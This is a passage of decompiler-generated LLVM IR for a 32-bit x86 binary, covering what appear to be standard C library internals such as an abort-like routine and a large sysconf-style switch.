  %v1_80527a5 = or i32 %v2_80527a1, 1
  store i32 %v1_80527a5, i32* %eax.global-to-local, align 4
  %v1_80527a8 = load i32, i32* @ecx, align 4
  %v2_80527a8 = add i32 %v1_80527a8, 4
  %v3_80527a8 = inttoptr i32 %v2_80527a8 to i32*
  store i32 %v1_80527a5, i32* %v3_80527a8, align 4
  %v0_80527ab = load i32, i32* @ecx, align 4
  store i32 %v0_80527ab, i32* @global_var_805534c.33, align 4
  br label %dec_label_pc_80527b1

dec_label_pc_80527b1:                             ; preds = %dec_label_pc_805277c, %dec_label_pc_80527a1
  %v0_80527b1 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_80527b1, 131072
  br i1 %tmp21, label %dec_label_pc_8052816, label %dec_label_pc_80527b9

dec_label_pc_80527b9:                             ; preds = %dec_label_pc_80527b1
  %v0_80527b9 = load i8, i8* @global_var_8055320.32, align 32
  %v1_80527b9 = and i8 %v0_80527b9, 2
  %v2_80527b9 = icmp eq i8 %v1_80527b9, 0
  br i1 %v2_80527b9, label %dec_label_pc_80527d2, label %dec_label_pc_80527c2

dec_label_pc_80527c2:                             ; preds = %dec_label_pc_80527b9
  %v2_80527ca = call i32 @function_80524eb(i32* bitcast (i8* @global_var_8055320.32 to i32*))
  store i32 %v2_80527ca, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80527d2

dec_label_pc_80527d2:                             ; preds = %dec_label_pc_80527b9, %dec_label_pc_80527c2
  %v0_80527d2 = load i32, i32* @global_var_805534c.33, align 4
  store i32 %v0_80527d2, i32* %eax.global-to-local, align 4
  %v1_80527d7 = add i32 %v0_80527d2, 4
  %v2_80527d7 = inttoptr i32 %v1_80527d7 to i32*
  %v3_80527d7 = load i32, i32* %v2_80527d7, align 4
  %v1_80527da = and i32 %v3_80527d7, -4
  store i32 %v1_80527da, i32* %eax.global-to-local, align 4
  %v1_80527dd = load i32, i32* @global_var_8055664.49, align 4
  %v7_80527dd = icmp ult i32 %v1_80527da, %v1_80527dd
  br i1 %v7_80527dd, label %dec_label_pc_8052816, label %dec_label_pc_80527e5

dec_label_pc_80527e5:                             ; preds = %dec_label_pc_80527d2
  store i32 ptrtoint (i8* @global_var_8055320.32 to i32), i32* @edx, align 4
  %v0_80527ea = load i32, i32* @global_var_8055668.47, align 8
  store i32 %v0_80527ea, i32* @eax, align 4
  %v0_80527ef = call i32 @function_805245e()
  store i32 %v0_80527ef, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052816

dec_label_pc_80527f6:                             ; preds = %dec_label_pc_80526fe
  %v2_80527f6 = inttoptr i32 %v1_80526c7 to i32*
  %v3_80527f6 = load i32, i32* %v2_80527f6, align 4
  %v0_80527f9 = load i32, i32* @global_var_8055670.40, align 16
  %v1_80527f9 = add i32 %v0_80527f9, -1
  store i32 %v1_80527f9, i32* @global_var_8055670.40, align 16
  %v2_80527ff = add i32 %v3_80527f6, %v1_80526d7
  store i32 %v2_80527ff, i32* %eax.global-to-local, align 4
  %v2_8052802 = sub i32 %v1_80526c7, %v3_80527f6
  %v0_8052808 = load i32, i32* @global_var_8055684.43, align 4
  %v2_8052808 = sub i32 %v0_8052808, %v2_80527ff
  store i32 %v2_8052808, i32* @global_var_8055684.43, align 4
  %v4_805280e = inttoptr i32 %v2_8052802 to i32*
  %v5_805280e = call i32 @function_805355d(i32* %v4_805280e, i32 %v2_80527ff, i32 %v1_80526d7, i32 %v1_80526d7)
  store i32 %v5_805280e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052816

dec_label_pc_8052816:                             ; preds = %dec_label_pc_80527d2, %dec_label_pc_80527b1, %dec_label_pc_80527e5, %dec_label_pc_80526de, %dec_label_pc_80527f6
  store i32 %v2_80526b1, i32* @eax, align 4
  %v2_805281f = call i32 @function_8052dfa(i32 %v2_80526b1, i32 1)
  store i32 %v2_805281f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052827

dec_label_pc_8052827:                             ; preds = %dec_label_pc_8052693, %dec_label_pc_8052816
  %.0 = phi i32 [ undef, %dec_label_pc_8052693 ], [ %v2_805281f, %dec_label_pc_8052816 ]
  store i32 %v0_8052696, i32* @ebx, align 4
  store i32 %v0_8052695, i32* @esi, align 4
  store i32 %v0_8052694, i32* @edi, align 4
  store i32 %v0_8052693, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_80527f6, { 1, 0 }
  uselistorder i32 %v0_805278b, { 1, 0 }
  uselistorder i32 %v1_8052756, { 1, 0 }
  uselistorder i32 %v2_805274f, { 1, 0 }
  uselistorder i32 %v1_8052744, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052753, { 1, 0 }
  uselistorder i32 %v1_80526d7, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_80526d2, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80526c7, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 (i32*)* @function_80524eb, { 3, 0, 1, 2 }
  uselistorder i32* bitcast (i8* @global_var_8055320.32 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8055354.35 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805534c.33, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_8055320.32 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8055320.32, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805503c.31 to i32), { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8052827, { 1, 0 }
  uselistorder label %dec_label_pc_8052816, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80527d2, { 1, 0 }
  uselistorder label %dec_label_pc_80527b1, { 1, 0 }
  uselistorder label %dec_label_pc_805277c, { 1, 0 }
  uselistorder label %dec_label_pc_8052774, { 1, 0 }
  uselistorder label %dec_label_pc_8052740, { 1, 0 }
}

define i32 @function_805282f() local_unnamed_addr {
dec_label_pc_805284a.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_805283b = call i32 @function_8052df7(i32 ptrtoint (i32* @global_var_8055054.52 to i32))
  %v12_8052845 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805284a48 = add i32 %v12_8052845, 276
  %v5_805284a49 = inttoptr i32 %v4_805284a48 to i32*
  store i32 0, i32* %v5_805284a49, align 4
  %v0_805285550 = load i32, i32* %eax.global-to-local, align 4
  %v1_805285551 = add i32 %v0_805285550, -1
  %v9_805285552 = icmp slt i32 %v1_805285551, 0
  store i32 %v1_805285551, i32* %eax.global-to-local, align 4
  %v1_805285653 = icmp eq i1 %v9_805285552, false
  br i1 %v1_805285653, label %dec_label_pc_805284a.dec_label_pc_805284a_crit_edge, label %dec_label_pc_8052858

dec_label_pc_805284a.dec_label_pc_805284a_crit_edge: ; preds = %dec_label_pc_805284a.lr.ph, %dec_label_pc_805284a.dec_label_pc_805284a_crit_edge
  %v1_805285554 = phi i32 [ %v1_8052855, %dec_label_pc_805284a.dec_label_pc_805284a_crit_edge ], [ %v1_805285551, %dec_label_pc_805284a.lr.ph ]
  %v0_805284a.pre = load i32, i32* @esp, align 4
  %v2_805284a = mul i32 %v1_805285554, 4
  %v3_805284a = add i32 %v0_805284a.pre, 152
  %v4_805284a = add i32 %v3_805284a, %v2_805284a
  %v5_805284a = inttoptr i32 %v4_805284a to i32*
  store i32 0, i32* %v5_805284a, align 4
  %v0_8052855 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052855 = add i32 %v0_8052855, -1
  %v9_8052855 = icmp slt i32 %v1_8052855, 0
  store i32 %v1_8052855, i32* %eax.global-to-local, align 4
  %v1_8052856 = icmp eq i1 %v9_8052855, false
  br i1 %v1_8052856, label %dec_label_pc_805284a.dec_label_pc_805284a_crit_edge, label %dec_label_pc_8052858

dec_label_pc_8052858:                             ; preds = %dec_label_pc_805284a.dec_label_pc_805284a_crit_edge, %dec_label_pc_805284a.lr.ph
  %v0_8052858 = load i32, i32* @ebx, align 4
  %v2_805285c = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805285c, i32* @ebx, align 4
  %v4_8052864 = call i32 @function_8051888(i32 %v2_805285c, i32 6, i32 %v0_8052858, i32 %v0_8052858)
  store i32 %v4_8052864, i32* %eax.global-to-local, align 4
  %v1_805286c = icmp eq i32 %v4_8052864, 0
  %v1_805286e = icmp eq i1 %v1_805286c, false
  br i1 %v1_805286e, label %dec_label_pc_805287e, label %dec_label_pc_8052870

dec_label_pc_8052870:                             ; preds = %dec_label_pc_8052858
  %v3_8052876 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8052876 = call i32 @function_80511cf(i32 1, %_TYPEDEF_sigset_t* %v3_8052876, i32 0)
  store i32 %v4_8052876, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805287e

dec_label_pc_805287e:                             ; preds = %dec_label_pc_8052858, %dec_label_pc_8052870
  %v2_80528b623 = phi i32 [ %v4_8052864, %dec_label_pc_8052858 ], [ %v4_8052876, %dec_label_pc_8052870 ]
  %v0_805287e = load i8, i8* @global_var_8055134.53, align 4
  %v1_805287e = icmp eq i8 %v0_805287e, 0
  %v1_8052885 = icmp eq i1 %v1_805287e, false
  br i1 %v1_8052885, label %dec_label_pc_80528b6, label %dec_label_pc_8052887

dec_label_pc_8052887:                             ; preds = %dec_label_pc_805287e
  store i8 1, i8* @global_var_8055134.53, align 4
  br label %dec_label_pc_805288e

dec_label_pc_805288e:                             ; preds = %dec_label_pc_80528f5, %dec_label_pc_8052887
  %v1_8052896 = call i32 @function_8052df7(i32 ptrtoint (i32* @global_var_8055054.52 to i32))
  store i32 %v1_8052896, i32* %eax.global-to-local, align 4
  %v1_80528a2 = call i32 @function_8053775(i32 6)
  store i32 %v1_80528a2, i32* %eax.global-to-local, align 4
  %v1_80528ae = call i32 @function_8052df7(i32 ptrtoint (i32* @global_var_8055054.52 to i32))
  store i32 %v1_80528ae, i32* %eax.global-to-local, align 4
  %v0_80528b6.pre = load i8, i8* @global_var_8055134.53, align 4
  br label %dec_label_pc_80528b6

dec_label_pc_80528b6:                             ; preds = %dec_label_pc_805287e, %dec_label_pc_805288e
  %v2_80528b6 = phi i32 [ %v2_80528b623, %dec_label_pc_805287e ], [ %v1_80528ae, %dec_label_pc_805288e ]
  %v0_80528b6 = phi i8 [ %v0_805287e, %dec_label_pc_805287e ], [ %v0_80528b6.pre, %dec_label_pc_805288e ]
  %v1_80528b6 = zext i8 %v0_80528b6 to i32
  %v3_80528b6 = and i32 %v2_80528b6, -256
  %v4_80528b6 = or i32 %v1_80528b6, %v3_80528b6
  store i32 %v4_80528b6, i32* %eax.global-to-local, align 4
  %v10_80528bb = icmp eq i8 %v0_80528b6, 1
  %v1_80528bd = icmp eq i1 %v10_80528bb, false
  br i1 %v1_80528bd, label %dec_label_pc_8052917, label %dec_label_pc_80528ea.lr.ph

dec_label_pc_80528ea.lr.ph:                       ; preds = %dec_label_pc_80528b6
  store i8 2, i8* @global_var_8055134.53, align 4
  %v2_80528ce = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80528ce, i32* %eax.global-to-local, align 4
  %v3_80528d3 = bitcast i32* %stack_var_-272 to i8*
  %v4_80528d3 = call i32 @function_80514ec(i8* %v3_80528d3, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_80528ea40 = add i32 %v12_8052845, 140
  %v5_80528ea41 = inttoptr i32 %v4_80528ea40 to i32*
  store i32 -1, i32* %v5_80528ea41, align 4
  %v0_80528f242 = load i32, i32* %eax.global-to-local, align 4
  %v1_80528f243 = add i32 %v0_80528f242, -1
  %v9_80528f244 = icmp slt i32 %v1_80528f243, 0
  store i32 %v1_80528f243, i32* %eax.global-to-local, align 4
  %v1_80528f345 = icmp eq i1 %v9_80528f244, false
  br i1 %v1_80528f345, label %dec_label_pc_80528ea.dec_label_pc_80528ea_crit_edge, label %dec_label_pc_80528f5

dec_label_pc_80528ea.dec_label_pc_80528ea_crit_edge: ; preds = %dec_label_pc_80528ea.lr.ph, %dec_label_pc_80528ea.dec_label_pc_80528ea_crit_edge
  %v1_80528f246 = phi i32 [ %v1_80528f2, %dec_label_pc_80528ea.dec_label_pc_80528ea_crit_edge ], [ %v1_80528f243, %dec_label_pc_80528ea.lr.ph ]
  %v0_80528ea.pre = load i32, i32* @esp, align 4
  %v2_80528ea = mul i32 %v1_80528f246, 4
  %v3_80528ea = add i32 %v0_80528ea.pre, 16
  %v4_80528ea = add i32 %v3_80528ea, %v2_80528ea
  %v5_80528ea = inttoptr i32 %v4_80528ea to i32*
  store i32 -1, i32* %v5_80528ea, align 4
  %v0_80528f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80528f2 = add i32 %v0_80528f2, -1
  %v9_80528f2 = icmp slt i32 %v1_80528f2, 0
  store i32 %v1_80528f2, i32* %eax.global-to-local, align 4
  %v1_80528f3 = icmp eq i1 %v9_80528f2, false
  br i1 %v1_80528f3, label %dec_label_pc_80528ea.dec_label_pc_80528ea_crit_edge, label %dec_label_pc_80528f5

dec_label_pc_80528f5:                             ; preds = %dec_label_pc_80528ea.dec_label_pc_80528ea_crit_edge, %dec_label_pc_80528ea.lr.ph
  store i32 %v2_80528ce, i32* %eax.global-to-local, align 4
  %v4_805290a = call i32 @function_8053037(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_805290a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805288e

dec_label_pc_8052917:                             ; preds = %dec_label_pc_80528b6
  %v10_8052917 = icmp eq i8 %v0_80528b6, 2
  %v1_8052919 = icmp eq i1 %v10_8052917, false
  br i1 %v1_8052919, label %dec_label_pc_8052923, label %dec_label_pc_8052923.thread

dec_label_pc_8052923.thread:                      ; preds = %dec_label_pc_8052917
  store i8 3, i8* @global_var_8055134.53, align 4
  br label %dec_label_pc_805292c

dec_label_pc_8052923:                             ; preds = %dec_label_pc_8052917
  %v9_8052923 = icmp eq i8 %v0_80528b6, 3
  %v1_805292a = icmp eq i1 %v9_8052923, false
  br i1 %v1_805292a, label %dec_label_pc_805293d, label %dec_label_pc_805292c

dec_label_pc_805292c:                             ; preds = %dec_label_pc_8052923.thread, %dec_label_pc_8052923
  store i8 4, i8* @global_var_8055134.53, align 4
  %v1_8052938 = call i32 @function_8053198(i32 127)
  unreachable

dec_label_pc_805293d:                             ; preds = %dec_label_pc_8052923, %dec_label_pc_805293d
  br label %dec_label_pc_805293d

; uselistorder directives
  uselistorder i32 %v1_80528f2, { 2, 1, 0 }
  uselistorder i32 %v1_8052855, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 4, 5, 6, 15, 16, 0, 1, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 2, 3 }
  uselistorder i8 4, { 2, 0, 1 }
  uselistorder i8 3, { 11, 13, 0, 8, 9, 1, 2, 3, 4, 5, 6, 7, 12, 10 }
  uselistorder i32 (i32, i32*, i32)* @function_8053037, { 1, 0 }
  uselistorder i8 2, { 16, 22, 19, 1, 20, 2, 3, 4, 5, 6, 17, 18, 7, 8, 10, 11, 12, 0, 21, 9, 13, 14, 15 }
  uselistorder i8* @global_var_8055134.53, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805293d, { 1, 0 }
  uselistorder label %dec_label_pc_805292c, { 1, 0 }
  uselistorder label %dec_label_pc_80528ea.dec_label_pc_80528ea_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_80528b6, { 1, 0 }
  uselistorder label %dec_label_pc_805287e, { 1, 0 }
  uselistorder label %dec_label_pc_805284a.dec_label_pc_805284a_crit_edge, { 1, 0 }
}

define i32 @function_8052a83(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052a83:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8052a96 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8052a96, i32* @ebx, align 4
  %v2_8052a9b = call i32 @function_8052dfa(i32 %v2_8052a96, i32 134557175)
  %v1_8052aa7 = call i32 @function_8052df7(i32 ptrtoint (i32* @global_var_805506c.54 to i32))
  %v0_8052aac = load i32, i32* @global_var_8055138.55, align 8
  store i32 %v0_8052aac, i32* @eax, align 4
  %v1_8052ab4 = icmp eq i32 %v0_8052aac, 0
  br i1 %v1_8052ab4, label %dec_label_pc_8052ac1, label %dec_label_pc_8052ab8

dec_label_pc_8052ab8:                             ; preds = %dec_label_pc_8052a83
  %v0_8052abb = load i32, i32* @esi, align 4
  %v1_8052abc = call i32 @unknown_0(i32 %v0_8052abb)
  store i32 %v1_8052abc, i32* @eax, align 4
  br label %dec_label_pc_8052ac1

dec_label_pc_8052ac1:                             ; preds = %dec_label_pc_8052a83, %dec_label_pc_8052ab8
  %v2_8052ac6 = call i32 @function_8052dfa(i32 %v2_8052a96, i32 1)
  %v0_8052acb = call i32 @function_8052db8()
  %v0_8052ae4 = load i32, i32* @esi, align 4
  %v1_8052ae5 = call i32 @function_8053198(i32 %v0_8052ae4)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_8053198, { 1, 0 }
  uselistorder i32 (i32)* @function_8052df7, { 3, 2, 1, 0, 5, 10, 8, 7, 9, 6, 4 }
  uselistorder i32 (i32, i32)* @function_8052dfa, { 1, 0, 6, 5, 2, 13, 10, 9, 8, 7, 12, 11, 4, 3 }
  uselistorder label %dec_label_pc_8052ac1, { 1, 0 }
}

define i32 @function_8052c73(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052c73:
  switch i32 %arg1, label %dec_label_pc_8052c92 [
    i32 0, label %dec_label_pc_8052ca2
    i32 1, label %dec_label_pc_8052d87
    i32 2, label %dec_label_pc_8052cac
    i32 3, label %dec_label_pc_8052cb6
    i32 4, label %dec_label_pc_8052cc0
    i32 5, label %dec_label_pc_8052d56
    i32 6, label %dec_label_pc_8052cc8
    i32 7, label %dec_label_pc_8052c88
    i32 8, label %dec_label_pc_8052c88
    i32 9, label %dec_label_pc_8052c88
    i32 10, label %dec_label_pc_8052c88
    i32 11, label %dec_label_pc_8052c88
    i32 12, label %dec_label_pc_8052c88
    i32 13, label %dec_label_pc_8052c88
    i32 14, label %dec_label_pc_8052c88
    i32 15, label %dec_label_pc_8052c88
    i32 16, label %dec_label_pc_8052c88
    i32 17, label %dec_label_pc_8052c88
    i32 18, label %dec_label_pc_8052c88
    i32 19, label %dec_label_pc_8052c88
    i32 20, label %dec_label_pc_8052c88
    i32 21, label %dec_label_pc_8052c88
    i32 22, label %dec_label_pc_8052c88
    i32 23, label %dec_label_pc_8052d87
    i32 24, label %dec_label_pc_8052d87
    i32 25, label %dec_label_pc_8052d93
    i32 26, label %dec_label_pc_8052d64
    i32 27, label %dec_label_pc_8052d87
    i32 28, label %dec_label_pc_8052cda
    i32 29, label %dec_label_pc_8052d5d
    i32 30, label %dec_label_pc_8052cd2
    i32 31, label %dec_label_pc_8052d72
    i32 32, label %dec_label_pc_8052d87
    i32 33, label %dec_label_pc_8052d87
    i32 34, label %dec_label_pc_8052d87
    i32 35, label %dec_label_pc_8052d6b
    i32 36, label %dec_label_pc_8052d9a
    i32 37, label %dec_label_pc_8052da1
    i32 38, label %dec_label_pc_8052d9a
    i32 39, label %dec_label_pc_8052ce4
    i32 40, label %dec_label_pc_8052da8
    i32 41, label %dec_label_pc_8052d87
    i32 42, label %dec_label_pc_8052d72
    i32 43, label %dec_label_pc_8052da1
    i32 44, label %dec_label_pc_8052daf
    i32 45, label %dec_label_pc_8052da1
    i32 46, label %dec_label_pc_8052d5d
    i32 47, label %dec_label_pc_8052d5d
    i32 48, label %dec_label_pc_8052d5d
    i32 49, label %dec_label_pc_8052d87
    i32 50, label %dec_label_pc_8052d87
    i32 51, label %dec_label_pc_8052d5d
    i32 52, label %dec_label_pc_8052d5d
    i32 53, label %dec_label_pc_8052d87
    i32 54, label %dec_label_pc_8052d87
    i32 55, label %dec_label_pc_8052d87
    i32 56, label %dec_label_pc_8052d87
    i32 57, label %dec_label_pc_8052d87
    i32 58, label %dec_label_pc_8052d87
    i32 59, label %dec_label_pc_8052d87
    i32 60, label %dec_label_pc_8052d87
    i32 61, label %dec_label_pc_8052d87
    i32 62, label %dec_label_pc_8052d87
    i32 63, label %dec_label_pc_8052d87
    i32 64, label %dec_label_pc_8052d87
    i32 65, label %dec_label_pc_8052d87
    i32 66, label %dec_label_pc_8052d87
    i32 67, label %dec_label_pc_8052c88
    i32 68, label %dec_label_pc_8052c88
    i32 69, label %dec_label_pc_8052d6b
    i32 70, label %dec_label_pc_8052d6b
    i32 71, label %dec_label_pc_8052d6b
    i32 72, label %dec_label_pc_8052d72
    i32 73, label %dec_label_pc_8052d79
    i32 74, label %dec_label_pc_8052d80
    i32 75, label %dec_label_pc_8052cee
    i32 76, label %dec_label_pc_8052d80
    i32 77, label %dec_label_pc_8052c88
    i32 78, label %dec_label_pc_8052c88
    i32 79, label %dec_label_pc_8052c88
    i32 80, label %dec_label_pc_8052c88
    i32 81, label %dec_label_pc_8052c88
    i32 82, label %dec_label_pc_8052c88
    i32 83, label %dec_label_pc_8052c88
    i32 84, label %dec_label_pc_8052c88
    i32 85, label %dec_label_pc_8052d87
    i32 86, label %dec_label_pc_8052d87
    i32 87, label %dec_label_pc_8052d64
    i32 88, label %dec_label_pc_8052cf8
    i32 89, label %dec_label_pc_8052d02
    i32 90, label %dec_label_pc_8052d79
    i32 91, label %dec_label_pc_8052c88
    i32 92, label %dec_label_pc_8052c88
    i32 93, label %dec_label_pc_8052c88
    i32 94, label %dec_label_pc_8052c88
    i32 95, label %dec_label_pc_8052d5d
    i32 96, label %dec_label_pc_8052d87
    i32 97, label %dec_label_pc_8052d87
    i32 98, label %dec_label_pc_8052c88
    i32 99, label %dec_label_pc_8052c88
    i32 100, label %dec_label_pc_8052c88
    i32 101, label %dec_label_pc_8052d0c
    i32 102, label %dec_label_pc_8052d4f
    i32 103, label %dec_label_pc_8052d8c
    i32 104, label %dec_label_pc_8052d64
    i32 105, label %dec_label_pc_8052d16
    i32 106, label %dec_label_pc_8052d72
    i32 107, label %dec_label_pc_8052d72
    i32 108, label %dec_label_pc_8052d56
    i32 109, label %dec_label_pc_8052d93
    i32 110, label %dec_label_pc_8052daf
    i32 111, label %dec_label_pc_8052d4f
    i32 112, label %dec_label_pc_8052d8c
    i32 113, label %dec_label_pc_8052daf
    i32 114, label %dec_label_pc_8052d20
    i32 115, label %dec_label_pc_8052da8
    i32 116, label %dec_label_pc_8052d87
    i32 117, label %dec_label_pc_8052d87
    i32 118, label %dec_label_pc_8052d2a
    i32 119, label %dec_label_pc_8052d34
    i32 120, label %dec_label_pc_8052da1
    i32 121, label %dec_label_pc_8052d64
    i32 122, label %dec_label_pc_8052d64
    i32 123, label %dec_label_pc_8052d64
    i32 124, label %dec_label_pc_8052d64
    i32 125, label %dec_label_pc_8052c88
    i32 126, label %dec_label_pc_8052c88
    i32 127, label %dec_label_pc_8052d87
    i32 128, label %dec_label_pc_8052d87
    i32 129, label %dec_label_pc_8052c88
    i32 130, label %dec_label_pc_8052c88
    i32 131, label %dec_label_pc_8052d87
    i32 149, label %dec_label_pc_8052d3b
  ]

dec_label_pc_8052c88:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052c92:                             ; preds = %dec_label_pc_8052c73
  %v1_8052c92 = call i32 @function_805149b(i32 ptrtoint (i32* @0 to i32))
  %v1_8052c97 = inttoptr i32 %v1_8052c92 to i32*
  store i32 22, i32* %v1_8052c97, align 4
  br label %dec_label_pc_8052d87

dec_label_pc_8052ca2:                             ; preds = %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052cac:                             ; preds = %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052cb6:                             ; preds = %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052cc0:                             ; preds = %dec_label_pc_8052c73
  %v0_8052cc3 = call i32 @function_80533bd()
  br label %dec_label_pc_8052cc8

dec_label_pc_8052cc8:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052cc0
  br label %dec_label_pc_8052db4

dec_label_pc_8052cd2:                             ; preds = %dec_label_pc_8052c73
  %v0_8052cd5 = call i32 @function_8053454()
  br label %dec_label_pc_8052cda

dec_label_pc_8052cda:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052cd2
  br label %dec_label_pc_8052db4

dec_label_pc_8052ce4:                             ; preds = %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052cee:                             ; preds = %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052cf8:                             ; preds = %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052d02:                             ; preds = %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052d0c:                             ; preds = %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052d16:                             ; preds = %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052d20:                             ; preds = %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052d2a:                             ; preds = %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052d34:                             ; preds = %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052d3b:                             ; preds = %dec_label_pc_8052c73
  %v5_8052d41 = call i32 @function_80531c0(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8052d49 = icmp slt i32 %v5_8052d41, 0
  %v1_8052d4b = icmp eq i1 %v2_8052d49, false
  br i1 %v1_8052d4b, label %dec_label_pc_8052d5d, label %dec_label_pc_8052d87

dec_label_pc_8052d4f:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052d56:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052d5d:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052d3b
  br label %dec_label_pc_8052db4

dec_label_pc_8052d64:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052d6b:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052d72:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73, %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052d79:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

dec_label_pc_8052d80:                             ; preds = %dec_label_pc_8052c73, %dec_label_pc_8052c73
  br label %dec_label_pc_8052db4

